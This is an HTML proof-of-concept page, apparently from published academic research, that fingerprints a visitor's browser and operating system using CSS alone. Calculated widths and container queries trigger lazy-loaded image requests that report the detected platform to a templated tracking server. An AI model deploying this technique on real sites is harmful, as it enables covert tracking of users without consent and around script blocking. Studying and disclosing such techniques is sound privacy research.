<html lang='en'>
  <head>
    <!-- MIT License -->
    <!-- Copyright (c) 2024 L. Trampert, D. Weber, L. Gerlach, C. Rossow, M. Schwarz -->
    <!-- Original Code: https://github.com/cispa/cascading-spy-sheets/blob/main/pocs/browser/poc_chrome.html -->
    <meta charset='UTF-8' />
    <meta name='viewport' content='width=device-width, initial-scale=1.0' />
    <title>Fingerprinting PoC</title>
    <style>
      /* Shared Styles */
      .wrapper {
        width: fit-content;
      }
      .browser, .os{
        display: none;
      }
      #chContainer,
      #ffContainer {
        container: browsercontainer / inline-size;
      }
    </style>
  </head>
  <body>
    <h4>Calc OS Fingerprinting</h4>
    <p>This is designed to distinguish clean installs of Windows 11 and Ubuntu
      22.04 LTS.</p>
    <p> Page id: {{id}}</p>
    <style>
    @supports not (-moz-appearance: none) {
      #chTarget {      
          width: calc(
            1px *
              (
                e + pi *
                  sin(
                    317326.39402987924 * -210861.19767869983 *
                      (
                        36781.96919420755 / cos(129868.3654533018) *
                          cos(-30780.497322536892) - pi * -115536.38801368067 *
                          0.1396149976644665
                      )
                  )
              )
          );
        }

        /* Chrome + Ubuntu 22.04  (width: 0px) */
        @container browsercontainer (width: 0px) {
          #chUb {
            display: inline;
            color: green;
          }
          #chWin {
            display: none;
          }
        }

        /* Chrome + Windows 11  (width: 1.84375px) */
        @container browsercontainer (width: 1.84375px) {
          #chWin {
            display: inline;
            color: red;
          }
          #chUb{
            display: none;
          }
        }
      }
    @supports (-moz-appearance: none) {
      #ffTarget {       
        width: calc(
          1px *
            (
               (  e  * 0.06314882636070251 - 0.06699182000011206 /  ( 
              327510.10546596383 * 101099.74005273856 )  )  + 
              0.9363944577053189 /  sin(  sin( 86911.80023335948 *  tan( 
              122224.59393033749 )  /  tan( 250486.18265094055 )  +  ( 
              169617.27745474092 )  /  pi  * 19.00493122072233 - 
              0.22360279853455722 )  / 50590.01594434995 +  tan(  ( 
              110958.53977223029 )  + 109345.15143883083 * 99223.79864865377 
              + 0.05425928323529661 )  / 94812.65262083427 *  pi  )  - 
              0.8964629967231303 * -341499.34226304095
            )
        );
      }

      /* Firefox + Ubuntu 22.04  (width: 293874.6875px) */
      @container browsercontainer (width: 293874.6875px) {
          #ffUb {
            display: inline;
            color: green;
          }
          #ffWin{
            display: none;
          }
      }

      /* Firefox + Windows 11  (width: 293694.0625px) */
      @container browsercontainer (width: 293694.0625px) {
          #ffWin {
            display: inline;
            color: red;
          }
          #ffUb {
            display: none;
          }
      }
    }
    </style>
    <div class='wrapper'>
      <div id='chTarget'></div>
      <div id='chContainer'>
        <span id='chUb' class="browser">Chrome/Ubuntu 22.04</span>
        <img
          id='chUb'
          src='{{serverDomain}}/image?id={{id}}&client=chrome&os=ubuntu22.04'
          loading='lazy'
        />
        <span id='chWin' class="browser">Chrome/Windows 11</span>
        <img
          id='chWin'
          src='{{serverDomain}}/image?id={{id}}&client=chrome&os=windows11'
          loading='lazy'
        />
      </div>
    </div>
    <div class='wrapper'>
      <div id='ffTarget'></div>
      <div id='ffContainer'>
          <span id='ffWin' class="browser">Firefox/Windows 11</span>
          <img
            id='ffWin'
            src='{{serverDomain}}/image?id={{id}}&client=firefox&os=windows11'
            loading='lazy'
          />
          <span id='ffUb' class="os">Firefox/Ubuntu 22.04</span>
          <img
            id='ffUb'
            src='{{serverDomain}}/image?id={{id}}&client=firefox&os=ubuntu22.04'
            loading='lazy'
          />
      </div>
    </div>

    <h4>Element Width OS Fingerprinting</h4>
    <p>This is designed to distinguish clean installs of Windows 11 and Ubuntu
      22.04 LTS.</p>
    <style>
      #containerEmail {
        container: emailcontainer / inline-size;
      }
      @container emailcontainer (width: 185px) {
        #emailUbuntu {
          color: orangered;
        }
        #emailWindows {
          display: none;
        }
      }
      @container emailcontainer (width: 177px) {
        #emailUbuntu {
          display: none;
        }
        #emailWindows {
          color: blue;
        }
      }
    </style>
    <div class='wrapper'>
      <input type='email' placeholder='name@email.com' />
      <div id='containerEmail'><span id='emailWindows'>Windows 11</span><span
          id='emailUbuntu'
        >Ubuntu 22.04</span></div>
    </div>
  </body>
</html>